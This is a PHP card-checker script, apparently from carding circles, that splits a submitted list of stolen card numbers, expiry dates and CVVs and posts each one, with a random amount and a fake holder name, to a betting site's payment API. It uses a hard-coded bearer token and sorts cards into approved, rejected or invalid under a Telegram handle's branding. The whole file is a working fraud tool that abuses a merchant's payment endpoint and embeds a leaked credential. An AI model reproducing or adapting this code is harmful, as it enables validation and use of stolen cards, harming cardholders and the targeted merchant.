<?php


DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}
function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];


$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);


$ip = "Proxy live ✅";


$randomNumber = rand(1000,2999);
$tempo = rand(1,4);


$ch = curl_init();
usleep($tempo);

curl_setopt($ch, CURLOPT_URL, 'https://eiger.reidopitaco.io/api/payments/credit/one-time');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"'.$randomNumber.'","cardCvv":"'.$cvv.'","cardExpirationDate":"'.$mes.'/'.$ano.'","cardHolderName":"jose da silva","cardNumber":"'.$cc.'"}');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: eiger.reidopitaco.io';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0';
$headers[] = 'Accept: application/json, text/plain, */*';
$headers[] = 'Accept-Language: pt-BR';
$headers[] = 'Content-Type: application/json;charset=utf-8';
$headers[] = 'Platform: web';
$headers[] = 'Package-Name: pitaco-web';
$headers[] = 'Version: web-latest';
$headers[] = 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImJlYmYxMDBlYWRkYTMzMmVjOGZlYTU3ZjliNWJjM2E2YWIyOWY1NTUiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vZmFudGFzeS1mMWFiMCIsImF1ZCI6ImZhbnRhc3ktZjFhYjAiLCJhdXRoX3RpbWUiOjE2NTIzODU4MjgsInVzZXJfaWQiOiI1ODVmMDFkZC00OGM0LTQyNTAtOGZkMS05NGFmZTE3MDllNGYiLCJzdWIiOiI1ODVmMDFkZC00OGM0LTQyNTAtOGZkMS05NGFmZTE3MDllNGYiLCJpYXQiOjE2NTI0Njk3OTcsImV4cCI6MTY1MjQ3MzM5NywiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6e30sInNpZ25faW5fcHJvdmlkZXIiOiJjdXN0b20ifX0.kpLj3sJ2PW9I-xcU0Ca7QFTy_XWxemAEtACcAOri9W5-xSgzISMOZU3RrlLUaLa-C4mjEo_jsJuR_sVLrTsBEKlRGFsxLLD3VlWekN3Ezf76DQI2Cudb_KwT3BXt4i9ENmSu72MSkXOz_NyeD6avDEio2IlHU6xClp4V--VuvyXKQZUCjjOAcje3JWCbEd_wa0SKkPWwYdUeOu0SGXEZB26v0b431IUORptEj9pf_gA_nTAPZsdFvKc5ln6dHY7qYQX4tRmBHRg8ZXdAlM3J8Rpj2zRCUrp6ovQQV9gdj-MXrUIu9h7n_-2H6cB79sfiPMVA_XwsVxmsN7lUss7R7A';
$headers[] = 'Access-Control-Allow-Origin: *';
$headers[] = 'Origin: https://app.reidopitaco.com.br';
$headers[] = 'Referer: https://app.reidopitaco.com.br/';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'Te: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$retorn = curl_exec($ch);



$msg = getStr($retorn, 'name":"', '"');  
$msg2 = getStr($retorn, 'message":"', '"');  
//message


if(strpos($retorn, "CreditCardRejectedException")){
	echo "Reprovada ➔ $lista | Retorno: [<font color='red'>$msg | $randomNumber</font> ] | #t.me/klzinnn <br>";

}elseif(strpos($retorn, "BadRequestException")){
    echo "Invalido ➔ $lista | Retorno: [<font color='red'>$msg2 | $randomNumber</font> ] | #t.me/klzinnn <br>";
}elseif(strpos($retorn, "CreditCardDeclinedException")){
    echo "Reprovada ➔ $lista | Retorno: [<font color='red'>$msg | $randomNumber</font> ] | #t.me/klzinnn <br>";
}elseif(strpos($retorn, "HttpException")){
    echo "Invalido ➔ $lista | Retorno: [<font color='red'>$msg2 | $randomNumber</font> ] | #t.me/klzinnn <br>";
}else{
    echo "Aprovada ➔ $lista | Retorno: [<font color='green'>$msg2 | $randomNumber</font> ] | #t.me/klzinnn <br>";
}
?>
